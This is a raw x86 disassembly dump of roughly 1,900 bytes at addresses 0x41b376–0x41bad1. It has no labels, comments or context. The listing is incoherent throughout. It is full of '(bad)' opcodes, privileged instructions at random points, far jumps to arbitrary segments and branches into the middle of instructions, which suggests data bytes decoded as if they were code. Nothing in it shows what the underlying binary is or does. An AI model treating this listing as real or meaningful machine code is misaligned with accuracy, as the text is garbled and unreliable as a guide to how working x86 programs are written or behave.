  41b376:	mov    ebx,0x72b0951e
  41b37b:	cmp    eax,0x3ca29ff8
  41b380:	xor    BYTE PTR [edx-0x6fa7da75],dl
  41b386:	sub    ah,BYTE PTR [esi-0xb2f82b1]
  41b38c:	jg     0x41b3dd
  41b38e:	mov    cs,WORD PTR [edi-0x417f5222]
  41b394:	fcmovu st,st(0)
  41b396:	gs and BYTE PTR ss:[eax-0x45],ch
  41b39b:	popf   
  41b39c:	mov    eax,ds:0xaa96ee74
  41b3a1:	xor    BYTE PTR [ecx+0x5d],0x2b
  41b3a5:	pop    ecx
  41b3a6:	dec    ebp
  41b3a7:	mov    ds:0x5831bd82,eax
  41b3ac:	icebp  
  41b3ad:	int    0x70
  41b3af:	imul   esp,ecx,0x88cad05c
  41b3b5:	test   DWORD PTR [ebx-0x507dc3e],ebx
  41b3bb:	cli    
  41b3bc:	cmp    ah,bh
  41b3be:	stos   DWORD PTR es:[edi],eax
  41b3bf:	and    al,0x6c
  41b3c1:	loope  0x41b3e6
  41b3c3:	add    eax,0x7e8512d6
  41b3c8:	std    
  41b3c9:	wbinvd 
  41b3cb:	into   
  41b3cc:	and    cl,0xa2
  41b3cf:	cmp    al,0xf4
  41b3d1:	rol    BYTE PTR [eax],0x53
  41b3d4:	mov    eax,0xe913f01f
  41b3d9:	jne    0x41b37a
  41b3db:	arpl   WORD PTR gs:[edi],si
  41b3de:	hlt    
  41b3df:	pop    edi
  41b3e0:	daa    
  41b3e1:	dec    esp
  41b3e2:	(bad)  
  41b3e3:	scas   eax,DWORD PTR es:[edi]
  41b3e4:	inc    eax
  41b3e5:	add    al,0x89
  41b3e7:	mov    esp,0x5cbc5998
  41b3ec:	mov    DWORD PTR [edx],ecx
  41b3ee:	mov    DWORD PTR [esi-0x30efb136],edx
  41b3f4:	lock adc al,0x26
  41b3f7:	xchg   edx,eax
  41b3f8:	dec    ebx
  41b3f9:	ja     0x41b403
  41b3fb:	inc    esi
  41b3fc:	or     cl,BYTE PTR [edx+0x42595c46]
  41b402:	cdq    
  41b403:	daa    
  41b404:	stos   DWORD PTR es:[edi],eax
  41b405:	adc    DWORD PTR [edx],0x9b10ddb1
  41b40b:	mov    edi,ebp
  41b40d:	mov    eax,ds:0x5294f80e
  41b412:	call   0x879:0x664f8de7
  41b419:	les    ebp,FWORD PTR [ebx+0x974c5fa]
  41b41f:	pop    edx
  41b420:	clc    
  41b421:	arpl   WORD PTR [edi],si
  41b423:	repz dec eax
  41b425:	sub    DWORD PTR [ebp+0x55],ebx
  41b428:	je     0x41b453
  41b42a:	in     al,0xa1
  41b42c:	fidivr DWORD PTR [ebp-0x6]
  41b42f:	mov    bl,0xe5
  41b431:	enter  0x8656,0x71
  41b435:	add    BYTE PTR [edi],cl
  41b437:	imul   ebp,DWORD PTR [edi+ebp*4+0x70],0xffffffd1
  41b43c:	mov    al,0xc1
  41b43e:	xchg   DWORD PTR [ebx+0x2f],esi
  41b441:	aas    
  41b442:	inc    esp
  41b443:	cmp    ebp,DWORD PTR es:[esi-0x31829298]
  41b44a:	xchg   ecx,eax
  41b44b:	push   ebx
  41b44c:	in     al,dx
  41b44d:	ret    0x233f
  41b450:	les    ebx,FWORD PTR [edx+0x2e2c9a41]
  41b456:	fwait
  41b457:	dec    ebp
  41b458:	ds loopne 0x41b4c8
  41b45b:	stos   DWORD PTR es:[edi],eax
  41b45c:	out    dx,eax
  41b45d:	aam    0xaf
  41b45f:	inc    ecx
  41b460:	sahf   
  41b461:	(bad)  
  41b462:	mov    esi,0x48112f1f
  41b467:	jmp    DWORD PTR [ecx]
  41b469:	adc    bh,bl
  41b46b:	jmp    0xc432:0x9f69e3c3
  41b472:	or     ebp,DWORD PTR [ebx-0x72]
  41b475:	xor    eax,DWORD PTR gs:[ebx-0x362ba03]
  41b47c:	mov    ebx,0xab32083c
  41b481:	cmp    ebx,DWORD PTR [ecx+0x42]
  41b484:	cmp    al,0xcd
  41b486:	popf   
  41b487:	sbb    DWORD PTR [esi+0x4],edx
  41b48a:	cmp    al,0xbb
  41b48c:	(bad)  
  41b48e:	rcr    DWORD PTR cs:0xf4bfa15f,cl
  41b495:	xor    ecx,ecx
  41b497:	cmc    
  41b498:	mov    cl,0x3e
  41b49a:	in     al,0x29
  41b49c:	fcomp  QWORD PTR [esi+0x2727cdc6]
  41b4a2:	fst    DWORD PTR [ecx]
  41b4a4:	inc    edx
  41b4a5:	and    ebx,DWORD PTR [ecx+eiz*1]
  41b4a8:	sbb    eax,0x7a130a2
  41b4ad:	and    bh,dh
  41b4af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4b0:	pop    edi
  41b4b1:	cli    
  41b4b2:	adc    BYTE PTR [edi],0xe2
  41b4b5:	fiadd  DWORD PTR [esi]
  41b4b7:	je     0x41b4db
  41b4b9:	inc    edi
  41b4ba:	inc    esp
  41b4bb:	or     eax,0xa9d0a943
  41b4c0:	(bad)  
  41b4c2:	cmp    al,0x68
  41b4c4:	cmp    BYTE PTR [ebp+0x7c754735],bh
  41b4ca:	pop    ss
  41b4cb:	cmp    eax,0x768bf02b
  41b4d0:	aad    0xda
  41b4d2:	xchg   ebp,eax
  41b4d3:	xor    al,0x19
  41b4d5:	sar    BYTE PTR [edx],cl
  41b4d7:	mov    esi,0xafeccd44
  41b4dc:	adc    eax,0x1732cf65
  41b4e1:	and    DWORD PTR [ebx-0xe60823c],esp
  41b4e7:	fst    QWORD PTR [ecx]
  41b4e9:	les    ebp,FWORD PTR [eax]
  41b4eb:	and    DWORD PTR [edx],0xffffff83
  41b4ee:	fmul   st(7),st
  41b4f0:	xor    eax,0xa9a56e92
  41b4f5:	shl    dl,cl
  41b4f7:	int3   
  41b4f8:	addr16 inc ebx
  41b4fa:	cmp    eax,0x31b30eca
  41b4ff:	xchg   edx,eax
  41b500:	sub    ecx,ecx
  41b502:	aam    0x1c
  41b504:	xchg   edx,eax
  41b505:	ss (bad) 
  41b507:	ficom  DWORD PTR [edi]
  41b509:	pop    edi
  41b50a:	gs pop esi
  41b50c:	pusha  
  41b50d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b50e:	ud1    esp,DWORD PTR [edi-0x24388bd0]
  41b515:	inc    eax
  41b516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b517:	sbb    DWORD PTR [edi*2+0x7a563ceb],edx
  41b51e:	je     0x41b584
  41b520:	scas   eax,DWORD PTR es:[edi]
  41b521:	xor    edx,DWORD PTR [esi]
  41b523:	dec    ecx
  41b524:	shl    BYTE PTR [edx+0x5c],cl
  41b527:	or     BYTE PTR [edi],dl
  41b529:	fcom   QWORD PTR [ebx-0x79ac7ded]
  41b52f:	aaa    
  41b530:	push   eax
  41b531:	not    DWORD PTR [ebx]
  41b533:	and    eax,0x193b256c
  41b538:	hlt    
  41b539:	scas   eax,DWORD PTR es:[edi]
  41b53a:	les    esp,FWORD PTR [ebx-0xd]
  41b53d:	cmp    ecx,DWORD PTR [eax-0x65]
  41b540:	jmp    0xd961462c
  41b545:	jb     0x41b5be
  41b547:	mov    bh,0x43
  41b549:	cmp    dl,BYTE PTR [esi]
  41b54b:	scas   eax,DWORD PTR es:[edi]
  41b54c:	fsub   st(2),st
  41b54e:	out    0xee,eax
  41b550:	mov    ebp,0xf21c2682
  41b555:	sub    cl,BYTE PTR [edx*4-0x469885fe]
  41b55c:	lds    esp,FWORD PTR [esi]
  41b55e:	add    eax,0x3090298c
  41b563:	pushf  
  41b564:	(bad)  
  41b565:	lock pop ebx
  41b567:	bound  ebx,QWORD PTR [esi]
  41b569:	or     ch,ah
  41b56b:	mov    esi,0x5b70518b
  41b570:	lds    edi,FWORD PTR [ebp-0x5a569211]
  41b576:	shl    DWORD PTR [eax+0x87e90ba],cl
  41b57c:	and    dh,ah
  41b57e:	or     BYTE PTR [ebx-0x61],0x72
  41b582:	pop    ebx
  41b583:	adc    eax,0xf23ab721
  41b588:	push   esp
  41b589:	(bad)
  41b58c:	xor    eax,0x1a6c5672
  41b591:	push   ecx
  41b592:	shl    dh,0xbd
  41b595:	jns    0x41b536
  41b597:	xchg   esp,eax
  41b598:	cmp    al,0x6e
  41b59a:	cmp    al,0x35
  41b59c:	mov    al,ds:0x57b283aa
  41b5a1:	out    dx,eax
  41b5a2:	or     al,0x76
  41b5a4:	jmp    FWORD PTR [eax+0x2fd83dbb]
  41b5aa:	inc    esp
  41b5ab:	push   0xf7d1f3c
  41b5b0:	mov    ch,al
  41b5b2:	fild   WORD PTR [esi]
  41b5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5b5:	add    esp,0xffffffe3
  41b5b8:	(bad)  
  41b5b9:	mov    al,0x77
  41b5bb:	lods   al,BYTE PTR ds:[esi]
  41b5bc:	push   eax
  41b5bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5be:	pop    edx
  41b5bf:	pop    ebp
  41b5c0:	inc    edi
  41b5c1:	mov    eax,ds:0x410d0555
  41b5c6:	xchg   ebx,eax
  41b5c7:	adc    BYTE PTR [edi+0x10],dl
  41b5ca:	dec    BYTE PTR fs:[ebx+0x36]
  41b5ce:	inc    edx
  41b5cf:	xor    eax,0x29876fc4
  41b5d4:	ret    0x5d36
  41b5d7:	jnp    0x41b5af
  41b5d9:	jb     0x41b56b
  41b5db:	jmp    0x689c9ec3
  41b5e0:	adc    ch,BYTE PTR [eax]
  41b5e2:	pop    ss
  41b5e3:	jno    0x41b5f3
  41b5e5:	ror    BYTE PTR gs:[ebp-0x421b1edc],cl
  41b5ec:	xchg   edx,eax
  41b5ed:	push   ds
  41b5ee:	test   DWORD PTR [edi+0x49],esi
  41b5f1:	ds push ss
  41b5f3:	cmp    al,0xb5
  41b5f5:	scas   eax,DWORD PTR es:[edi]
  41b5f6:	add    eax,DWORD PTR [ecx-0x4a5e8a7c]
  41b5fc:	out    dx,eax
  41b5fd:	pusha  
  41b5fe:	pop    ds
  41b5ff:	jl     0x41b676
  41b601:	lock aam 0x83
  41b604:	inc    ebp
  41b605:	dec    esp
  41b606:	lods   eax,DWORD PTR ds:[esi]
  41b607:	aaa    
  41b608:	clc    
  41b609:	repz jge 0x41b63b
  41b60c:	jns    0x41b596
  41b60e:	jg     0x41b5d8
  41b610:	mov    ds:0xf8bd0bc8,eax
  41b615:	mov    ch,0xf
  41b617:	and    DWORD PTR [esi-0x5e082639],ebp
  41b61d:	mov    WORD PTR [edx+0x52],gs
  41b620:	pop    edx
  41b621:	inc    eax
  41b622:	fs (bad) 
  41b625:	push   esi
  41b626:	das    
  41b627:	cmp    cl,bh
  41b629:	jp     0x41b69f
  41b62b:	pop    es
  41b62c:	push   ebp
  41b62d:	pop    esp
  41b62e:	leave  
  41b62f:	leave  
  41b630:	cwde   
  41b631:	and    DWORD PTR [ebx],ecx
  41b633:	out    0xd7,eax
  41b635:	xor    DWORD PTR [ebx+edx*8],edx
  41b638:	pop    esi
  41b639:	mov    al,ds:0xccd81d6d
  41b63e:	sub    eax,0x44931ddf
  41b643:	sub    eax,0xbe1004ff
  41b648:	retf   
  41b649:	std    
  41b64a:	xchg   esi,eax
  41b64b:	inc    esi
  41b64c:	mov    esp,0xef783877
  41b651:	enter  0x56a9,0x23
  41b655:	js     0x41b5fd
  41b657:	icebp  
  41b658:	sub    eax,0xf042bf3b
  41b65d:	jle    0x41b6b7
  41b65f:	adc    DWORD PTR [esi-0x7ea1f100],0x17
  41b666:	jb     0x41b673
  41b668:	(bad)  
  41b669:	idiv   DWORD PTR [esi+0x3f]
  41b66c:	das    
  41b66d:	pop    es
  41b66e:	je     0x41b6e1
  41b670:	out    0x4d,al
  41b672:	mov    edi,0x85be1ad
  41b677:	pop    ecx
  41b678:	push   0xfffffffc
  41b67a:	and    DWORD PTR [ebp+edx*4+0x62],edi
  41b67e:	mov    BYTE PTR [esi-0x50e47659],al
  41b684:	inc    edx
  41b685:	xchg   BYTE PTR [edx],al
  41b687:	aam    0x16
  41b689:	mov    ebp,0xc7e4d7f6
  41b68e:	jbe    0x41b6ee
  41b690:	adc    eax,0xffffff94
  41b693:	test   DWORD PTR [esi],esp
  41b695:	xchg   edx,eax
  41b696:	retf   
  41b697:	mov    bl,0xff
  41b699:	test   eax,0xebff4745
  41b69e:	pop    es
  41b69f:	fmulp  st(2),st
  41b6a1:	push   ebp
  41b6a2:	dec    ebx
  41b6a3:	sub    bl,BYTE PTR [eax+0x7f]
  41b6a6:	dec    ecx
  41b6a7:	(bad)  
  41b6a8:	mov    dh,0x93
  41b6aa:	lock mov bh,0x66
  41b6ad:	fdivrp st(2),st
  41b6af:	adc    DWORD PTR [edx-0x21],ebp
  41b6b2:	test   eax,0x50b9bea1
  41b6b7:	retf   0x44aa
  41b6ba:	push   esp
  41b6bb:	leave  
  41b6bc:	mov    ah,0x9f
  41b6be:	in     eax,0xaf
  41b6c0:	sub    eax,0xe6c20384
  41b6c5:	repz inc ebp
  41b6c7:	adc    BYTE PTR [edi+0x745d95dd],dh
  41b6cd:	push   edi
  41b6ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6cf:	mov    DWORD PTR [eax+ebx*8],ebx
  41b6d2:	into   
  41b6d3:	xor    al,0xb9
  41b6d5:	call   0x8c13699e
  41b6da:	das    
  41b6db:	jns    0x41b754
  41b6dd:	pop    esp
  41b6de:	jg     0x41b686
  41b6e0:	call   0x53f9:0x6f8d094a
  41b6e7:	aad    0x17
  41b6e9:	cmp    dh,cl
  41b6eb:	scas   eax,DWORD PTR es:[edi]
  41b6ec:	add    eax,0x50bd5033
  41b6f1:	mov    BYTE PTR [esi],bl
  41b6f3:	xor    cl,BYTE PTR [ebx+0x2e]
  41b6f6:	mov    ch,0xa8
  41b6f8:	sub    ecx,DWORD PTR [ebp+0x48]
  41b6fb:	cmc    
  41b6fc:	bound  edi,QWORD PTR [esi+ebp*2]
  41b6ff:	aam    0x96
  41b701:	bswap  edi
  41b703:	scas   eax,DWORD PTR es:[edi]
  41b704:	cs and al,0xda
  41b707:	ret    0x9abc
  41b70a:	push   ss
  41b70b:	ss mov ecx,0x602149d2
  41b711:	push   ss
  41b712:	(bad)  
  41b714:	sbb    esi,edi
  41b716:	push   0x2b
  41b718:	add    ebp,DWORD PTR [eax+0x4adb05fd]
  41b71e:	addr16 jne 0x41b77c
  41b721:	outs   dx,BYTE PTR ds:[esi]
  41b722:	pusha  
  41b723:	outs   dx,BYTE PTR ds:[esi]
  41b724:	or     DWORD PTR [esi+0x11c2be09],esp
  41b72a:	ret    
  41b72b:	mov    bl,0x10
  41b72d:	push   esp
  41b72e:	jb     0x41b78b
  41b730:	popf   
  41b731:	fsubp  st(4),st
  41b733:	cmp    al,0xb4
  41b735:	xor    al,0xb1
  41b737:	dec    ecx
  41b738:	xor    BYTE PTR [ecx+0x1f],0xf7
  41b73c:	cmp    dh,BYTE PTR [eax]
  41b73e:	and    eax,0x48f876d5
  41b743:	sbb    BYTE PTR [ebp+0x768ea187],bl
  41b749:	jae    0x41b799
  41b74b:	xchg   esp,eax
  41b74c:	retf   
  41b74d:	or     ah,BYTE PTR [eax-0x31]
  41b750:	out    dx,eax
  41b751:	leave  
  41b752:	jg     0x41b701
  41b754:	and    BYTE PTR [eax-0x21],dh
  41b757:	sti    
  41b758:	jmp    0x7423:0x6b126c61
  41b75f:	xor    al,0x84
  41b761:	push   ebx
  41b762:	or     edx,DWORD PTR [edx]
  41b764:	inc    edi
  41b765:	shl    al,cl
  41b767:	std    
  41b768:	add    esi,DWORD PTR [esi-0x1430a364]
  41b76e:	outs   dx,BYTE PTR ds:[esi]
  41b76f:	mov    al,ds:0x3d10abe5
  41b774:	and    esi,DWORD PTR [edx-0x34f0115f]
  41b77a:	and    bl,ah
  41b77c:	sahf   
  41b77d:	dec    ecx
  41b77e:	imul   ebp,DWORD PTR [ebx-0x10],0x24
  41b782:	push   ebp
  41b783:	mov    gs,WORD PTR [edx+eax*2+0x52]
  41b787:	mov    WORD PTR [edi-0x760a566e],cs
  41b78d:	ins    DWORD PTR es:[edi],dx
  41b78e:	sti    
  41b78f:	clc    
  41b790:	mov    bh,0x42
  41b792:	shl    DWORD PTR [ecx+0x76],1
  41b795:	leave  
  41b796:	mov    esp,0xac3e1b81
  41b79b:	xlat   BYTE PTR ds:[ebx]
  41b79c:	pop    ecx
  41b79d:	aam    0x6d
  41b79f:	inc    ecx
  41b7a0:	and    BYTE PTR [edx+0x1652c2eb],dh
  41b7a6:	cmp    al,ah
  41b7a8:	inc    esp
  41b7a9:	call   0xadb9:0x2c0f8772
  41b7b0:	xchg   DWORD PTR [ebp+0x1c65d519],ecx
  41b7b6:	jns    0x41b7c4
  41b7b8:	fmul   QWORD PTR [ecx+0x10]
  41b7bb:	pop    es
  41b7bc:	jge    0x41b7a1
  41b7be:	aam    0xac
  41b7c0:	mov    ecx,DWORD PTR [ecx]
  41b7c2:	dec    ebp
  41b7c3:	or     DWORD PTR [esi+0x4f],0x461e4a04
  41b7ca:	and    eax,0xf4e9f019
  41b7cf:	xchg   ecx,eax
  41b7d0:	ret    
  41b7d1:	cmp    esp,DWORD PTR [eax]
  41b7d3:	fist   DWORD PTR [eax-0x4c]
  41b7d6:	sbb    al,0xd3
  41b7d8:	inc    ebx
  41b7d9:	test   eax,0xcec38fe4
  41b7de:	push   esi
  41b7df:	push   ebp
  41b7e0:	cld    
  41b7e1:	xchg   esp,eax
  41b7e2:	(bad)  
  41b7e3:	and    al,0x3c
  41b7e5:	xchg   DWORD PTR [ebx],esp
  41b7e7:	mov    DWORD PTR [esi-0xe],edx
  41b7ea:	outs   dx,BYTE PTR ds:[esi]
  41b7eb:	mov    dh,0x41
  41b7ed:	shl    BYTE PTR [ecx],cl
  41b7ef:	stos   DWORD PTR es:[edi],eax
  41b7f0:	push   eax
  41b7f1:	cs pop eax
  41b7f3:	test   BYTE PTR [ecx-0x43aa4503],ch
  41b7f9:	adc    BYTE PTR [edi+edx*1-0x1d709a74],cl
  41b800:	pop    es
  41b801:	icebp  
  41b802:	or     eax,DWORD PTR [ebx]
  41b804:	out    0x89,al
  41b806:	stos   BYTE PTR es:[edi],al
  41b807:	mov    sp,0x914e
  41b80b:	jecxz  0x41b7b2
  41b80d:	rol    BYTE PTR [ebp+0x3ae18d82],0xed
  41b814:	sbb    al,0x9b
  41b816:	add    DWORD PTR [eax],esi
  41b818:	cmp    eax,0xa5143cf5
  41b81d:	mov    al,0x37
  41b81f:	push   esp
  41b820:	(bad)  
  41b822:	mov    bl,BYTE PTR [eax+0x70]
  41b825:	inc    ebx
  41b826:	stos   DWORD PTR es:[edi],eax
  41b827:	dec    ecx
  41b828:	adc    al,0xaf
  41b82a:	add    ebp,eax
  41b82c:	add    bh,dl
  41b82e:	fcom   st(6)
  41b830:	js     0x41b821
  41b832:	hlt    
  41b833:	jg     0x41b830
  41b835:	xchg   esp,eax
  41b836:	jne    0x41b7f2
  41b838:	dec    ecx
  41b839:	push   edx
  41b83a:	loopne 0x41b846
  41b83c:	(bad)  
  41b83d:	pop    ebx
  41b83e:	xchg   edx,eax
  41b83f:	lahf   
  41b840:	jno    0x41b826
  41b842:	inc    edi
  41b843:	push   ds
  41b844:	ins    DWORD PTR es:[edi],dx
  41b845:	popa   
  41b846:	(bad)  
  41b848:	mov    dl,0xfb
  41b84a:	shl    DWORD PTR [ebp-0x2a3a1226],cl
  41b850:	pop    esp
  41b851:	mov    al,0x30
  41b853:	lock jne 0x41b816
  41b856:	test   DWORD PTR [esi-0x7a],eax
  41b859:	sub    al,0xe4
  41b85b:	sub    eax,esp
  41b85d:	push   ds
  41b85e:	cld    
  41b85f:	inc    edi
  41b860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b861:	jno    0x41b829
  41b863:	xlat   BYTE PTR ds:[ebx]
  41b864:	sahf   
  41b865:	in     al,0xfa
  41b867:	cmp    DWORD PTR [edi+edi*1-0x9a09879],0x628b5969
  41b872:	mov    cl,0xe5
  41b874:	cs push es
  41b876:	xchg   edx,eax
  41b877:	push   ss
  41b878:	inc    edx
  41b879:	imul   eax,DWORD PTR [ebp+0x25237214],0x3a
  41b880:	dec    edi
  41b881:	xchg   BYTE PTR [ebx+0x34],al
  41b884:	cmp    DWORD PTR [eax+0x4c],ebx
  41b887:	jg     0x41b86a
  41b889:	pop    eax
  41b88a:	xlat   BYTE PTR ds:[ebx]
  41b88b:	sbb    al,0x14
  41b88d:	push   0x1f
  41b88f:	push   ss
  41b890:	scas   al,BYTE PTR es:[edi]
  41b891:	mov    edi,0x9e2fa169
  41b896:	fstp   DWORD PTR [ecx-0x171a3c04]
  41b89c:	dec    esi
  41b89d:	jmp    0x2a74:0x8aa920ea
  41b8a4:	gs pop ss
  41b8a6:	ja     0x41b890
  41b8a8:	je     0x41b8b1
  41b8aa:	push   cs
  41b8ab:	fcomp  st(4)
  41b8ad:	and    ebx,DWORD PTR [edx+0x17]
  41b8b0:	outs   dx,DWORD PTR ds:[esi]
  41b8b1:	cmp    ebp,edx
  41b8b3:	xchg   ebx,eax
  41b8b4:	fisubr WORD PTR es:[ebx-0x6b]
  41b8b8:	xor    ah,cl
  41b8ba:	cmp    dh,BYTE PTR [eax+0x7f8135eb]
  41b8c0:	jp     0x41b8b4
  41b8c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8c3:	stos   DWORD PTR es:[edi],eax
  41b8c4:	dec    esp
  41b8c5:	cmp    al,0x81
  41b8c7:	adc    eax,0x2b7e377c
  41b8cc:	xchg   esi,eax
  41b8cd:	cmp    ah,BYTE PTR [esi]
  41b8cf:	imul   ebx,DWORD PTR [eax-0x7a],0x2145f285
  41b8d6:	cmp    esp,DWORD PTR [eax]
  41b8d8:	sub    al,0x22
  41b8da:	je     0x41b952
  41b8dc:	dec    esi
  41b8dd:	pushf  
  41b8de:	xor    ah,cl
  41b8e0:	pop    esi
  41b8e1:	stos   BYTE PTR es:[edi],al
  41b8e2:	mov    esi,0x371fce1a
  41b8e7:	cs mov al,0xc7
  41b8ea:	stos   BYTE PTR es:[edi],al
  41b8eb:	sub    dh,BYTE PTR [ebx+0x76e60b9a]
  41b8f1:	pop    ds
  41b8f2:	jne    0x41b92a
  41b8f4:	inc    ebx
  41b8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8f6:	sub    DWORD PTR [ecx],ebp
  41b8f8:	jno    0x41b956
  41b8fa:	lock shl DWORD PTR [edi],cl
  41b8fd:	(bad)  ds:0x1a02efbb
  41b903:	mov    esi,edi
  41b905:	pop    edx
  41b906:	pop    ebx
  41b907:	and    edi,esi
  41b909:	ins    BYTE PTR es:[edi],dx
  41b90a:	jb     0x41b8a3
  41b90c:	inc    edi
  41b90d:	mov    cl,0xd1
  41b90f:	int3   
  41b910:	jmp    0x41b89d
  41b912:	mov    esi,0x854d0b1e
  41b917:	cli    
  41b918:	pop    ecx
  41b919:	xchg   edi,eax
  41b91a:	shl    DWORD PTR [ebp*2-0x46540e9f],1
  41b921:	in     al,0x38
  41b923:	add    al,BYTE PTR [ebp-0x452cc15]
  41b929:	and    al,0xba
  41b92b:	jae    0x41b946
  41b92d:	cmp    BYTE PTR [edi-0x47b93714],cl
  41b933:	int3   
  41b934:	mov    bl,0xfc
  41b936:	das    
  41b937:	bound  esi,QWORD PTR fs:[eax+esi*1+0x2d5a4554]
  41b93f:	jg     0x41b8e8
  41b941:	and    DWORD PTR [ebx+0x3eea737],ebp
  41b947:	push   0x6be51711
  41b94c:	(bad)  
  41b94d:	test   eax,0xf5edbaec
  41b952:	in     eax,0xc4
  41b954:	jmp    0x6281:0xa76582b
  41b95b:	int3   
  41b95c:	out    0x89,al
  41b95e:	lock pop bp
  41b961:	test   ch,dl
  41b963:	dec    edi
  41b964:	xchg   al,ch
  41b966:	ficom  WORD PTR ds:0x933d0fd9
  41b96c:	xor    bl,BYTE PTR [edx+0x5bc8344b]
  41b972:	es xchg ebx,eax
  41b974:	lods   al,BYTE PTR ds:[esi]
  41b975:	push   edx
  41b976:	int    0xa9
  41b978:	inc    ebx
  41b979:	repnz cwde 
  41b97b:	push   eax
  41b97c:	jae    0x41b93b
  41b97e:	mov    BYTE PTR [ecx-0x6d],dh
  41b981:	xor    BYTE PTR [edx],0xb2
  41b984:	jb     0x41b99c
  41b986:	test   BYTE PTR [eax-0x433608dc],ch
  41b98c:	xor    eax,0xf23fdf20
  41b991:	leave  
  41b992:	jecxz  0x41b9f8
  41b994:	pop    edi
  41b995:	or     esi,DWORD PTR [esp+edi*1+0x5c]
  41b999:	scas   eax,DWORD PTR es:[edi]
  41b99a:	clc    
  41b99b:	out    dx,al
  41b99c:	aam    0x66
  41b99e:	adc    BYTE PTR [ebx],dh
  41b9a0:	jg     0x41ba18
  41b9a2:	loop   0x41b92e
  41b9a4:	xchg   edi,eax
  41b9a5:	test   DWORD PTR [edx-0x31],edx
  41b9a8:	ret    0xfbd4
  41b9ab:	add    edx,DWORD PTR [ebp-0x34]
  41b9ae:	fwait
  41b9af:	leave  
  41b9b0:	outs   dx,BYTE PTR ds:[esi]
  41b9b1:	shl    BYTE PTR [ebp-0x58],1
  41b9b4:	adc    eax,0x62dfd54a
  41b9b9:	push   cs
  41b9ba:	xor    dl,cl
  41b9bc:	xchg   BYTE PTR [ebx+0x24847028],ch
  41b9c2:	std    
  41b9c3:	push   esi
  41b9c4:	jb     0x41b98f
  41b9c6:	fstp   QWORD PTR [edx+0x5b]
  41b9c9:	jmp    0xacdfed8f
  41b9ce:	jl     0x41b9ba
  41b9d0:	add    ebx,ebp
  41b9d2:	dec    esi
  41b9d3:	es xchg ebp,eax
  41b9d5:	inc    ebx
  41b9d6:	js     0x41b9ef
  41b9d8:	scas   eax,DWORD PTR es:[edi]
  41b9d9:	and    al,0xaf
  41b9db:	push   eax
  41b9dc:	jbe    0x41ba5c
  41b9de:	sysret 
  41b9e0:	jge    0x41b9d9
  41b9e2:	push   0x66
  41b9e4:	or     BYTE PTR [eax],dh
  41b9e6:	test   eax,0x2ab6c0c6
  41b9eb:	dec    ebp
  41b9ec:	stos   DWORD PTR es:[edi],eax
  41b9ed:	or     edx,DWORD PTR [ebx-0x71b06be1]
  41b9f3:	xchg   DWORD PTR [ebx-0x9180e13],eax
  41b9f9:	sbb    ebp,DWORD PTR [eax]
  41b9fb:	xor    eax,0x4a5293a0
  41ba00:	xor    DWORD PTR [eax+eiz*1],eax
  41ba03:	hlt    
  41ba04:	icebp  
  41ba05:	mov    ebp,0x110dff42
  41ba0a:	sbb    ebp,DWORD PTR [ecx-0x15]
  41ba0d:	mov    fs,WORD PTR [ecx+0x514aab7b]
  41ba13:	jge    0x41ba55
  41ba15:	call   0xd2f70682
  41ba1a:	jbe    0x41ba46
  41ba1c:	cmp    ebp,edx
  41ba1e:	pop    ds
  41ba1f:	int    0x7b
  41ba21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba22:	mov    esi,0x759b8565
  41ba27:	aam    0x34
  41ba29:	lahf   
  41ba2a:	adc    DWORD PTR [esi+0x72fddf77],eax
  41ba30:	mov    ebx,esi
  41ba32:	(bad)  
  41ba33:	cmp    eax,0x9caae3e5
  41ba38:	(bad)  
  41ba39:	icebp  
  41ba3a:	sbb    bl,0x3f
  41ba3d:	push   ecx
  41ba3e:	ds inc edi
  41ba40:	xor    DWORD PTR [edi-0x51accadd],ebx
  41ba46:	aam    0xb6
  41ba48:	mov    esi,0xe0944995
  41ba4d:	sti    
  41ba4e:	dec    ebx
  41ba4f:	in     al,dx
  41ba50:	inc    ecx
  41ba51:	add    al,0xcb
  41ba53:	cs dec eax
  41ba55:	scas   eax,DWORD PTR es:[edi]
  41ba56:	das    
  41ba57:	mov    cl,0xb2
  41ba59:	and    dh,BYTE PTR [esi+0x15e81063]
  41ba5f:	int    0xe3
  41ba61:	in     al,dx
  41ba62:	push   ecx
  41ba63:	sub    al,0xc7
  41ba65:	(bad)  
  41ba67:	sbb    BYTE PTR [ecx],0x98
  41ba6a:	ss mov dl,0xbb
  41ba6d:	mov    ch,0xdc
  41ba6f:	fiadd  WORD PTR [esi-0x73]
  41ba72:	test   ch,dh
  41ba74:	popf   
  41ba75:	mov    dh,0xd4
  41ba77:	sub    bh,BYTE PTR [edx]
  41ba79:	rol    BYTE PTR [eax-0x56],0x45
  41ba7d:	unpckhps xmm1,XMMWORD PTR [esi]
  41ba80:	repz cmp dl,BYTE PTR [edx+0x12]
  41ba84:	enter  0x3d5,0xf1
  41ba88:	mov    eax,ds:0x25d4b89f
  41ba8d:	int    0x4a
  41ba8f:	cld    
  41ba90:	push   edi
  41ba91:	or     bl,BYTE PTR [ecx]
  41ba93:	aaa    
  41ba94:	js     0x41baac
  41ba96:	gs mov ah,0xab
  41ba99:	pop    ebx
  41ba9a:	scas   al,BYTE PTR es:[edi]
  41ba9b:	mov    ch,0xaf
  41ba9d:	and    ebp,DWORD PTR [ecx+0x34e87f0b]
  41baa3:	push   ebx
  41baa4:	fmul   DWORD PTR [ecx-0x1593395c]
  41baaa:	fwait
  41baab:	lods   al,BYTE PTR ds:[esi]
  41baac:	imul   edx,DWORD PTR [ecx-0x4acd72b9],0xdd4e74
  41bab6:	outs   dx,DWORD PTR ds:[esi]
  41bab7:	and    BYTE PTR [eax+0x67],bh
  41baba:	sub    edi,ecx
  41babc:	push   cs
  41babd:	jge    0x41ba7a
  41babf:	sbb    DWORD PTR [edx+0x7602ded7],0x2e
  41bac6:	and    ebx,DWORD PTR [ebp+0x6d27aed3]
  41bacc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bacd:	hlt    
  41bace:	inc    eax
  41bacf:	in     eax,dx
  41bad0:	(bad)  
  41bad1:	lahf   
